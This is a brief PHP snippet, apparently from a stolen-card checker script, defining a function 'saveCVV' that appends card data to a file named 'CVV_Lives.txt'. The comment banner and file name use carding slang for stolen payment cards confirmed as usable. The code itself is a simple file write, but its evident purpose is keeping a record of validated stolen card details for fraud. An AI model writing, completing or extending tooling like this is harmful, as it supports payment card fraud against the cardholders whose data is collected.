<?php
#====================== [ SAVE CVV LIVES ] =====================#
function saveCVV($cc)
{
    $file = dirname(__FILE__) . "/CVV_Lives.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}